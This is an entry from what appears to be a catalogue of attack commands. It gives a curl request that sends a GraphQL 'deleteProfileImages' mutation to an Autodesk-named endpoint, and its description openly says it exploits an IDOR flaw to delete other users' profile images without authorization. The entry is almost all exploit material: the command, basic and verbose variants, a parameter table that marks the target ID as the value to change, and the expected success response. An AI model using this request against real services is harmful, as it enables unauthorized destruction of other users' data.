---
data: >-
  curl -X POST https://autodesk.example.com/graphql -H "Content-Type:
  application/json" -H "Authorization: Bearer YOUR_SESSION_TOKEN" -d '{"query":
  "mutation deleteProfileImages($id: ID!) { deleteProfileImages(id: $id) {
  success } }", "variables": {"id": "TARGET_USER_IMAGE_ID"}}'
tags:
  - graphql
  - web
  - exploitation
type: command
output: '{"data":{"deleteProfileImages":{"success":true}}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.993Z'
id: 70189dc9-545b-4b56-b3d8-29cfe710b0da
verified: false
validated: true
submitted: true
---
# curl-graphql-delete-mutation

## Command

```bash
curl -X POST https://autodesk.example.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" \
  -d '{"query": "mutation deleteProfileImages($id: ID!) { deleteProfileImages(id: $id) { success } }", "variables": {"id": "TARGET_USER_IMAGE_ID"}}'
```

## Description

This command uses curl to send a GraphQL mutation request to delete a profile image via the Autodesk API, exploiting IDOR by specifying an unauthorized 'id'. It is used in authenticated sessions to test or perform unauthorized deletions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format to JSON | Yes |
| `-H "Authorization: Bearer YOUR_SESSION_TOKEN"` | Provides the authentication token | Yes |
| `-d '{...}'` | The JSON payload containing the GraphQL query and variables | Yes |
| `https://autodesk.example.com/graphql` | The GraphQL endpoint URL | Yes |
| `"id": "TARGET_USER_IMAGE_ID"` | The image ID to target (modifiable for IDOR) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://autodesk.example.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer token123" -d '{"query": "mutation deleteProfileImages($id: ID!) { deleteProfileImages(id: $id) { success } }", "variables": {"id": "user-image-456"}}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://autodesk.example.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer token123" -d '{"query": "mutation deleteProfileImages($id: ID!) { deleteProfileImages(id: $id) { success } }", "variables": {"id": "user-image-456"}}'
```

## Expected Output

Successful execution returns a JSON response confirming deletion, such as:

```json
{"data":{"deleteProfileImages":{"success":true}}}
```

Errors may include authorization failures or invalid IDs, e.g., {"errors":[{"message":"Unauthorized"}]}. Look for the 'success' field to validate.

## Related

- [[Related Procedure: Exploit-IDOR-in-GraphQL-deleteProfileImages-Mutation]]
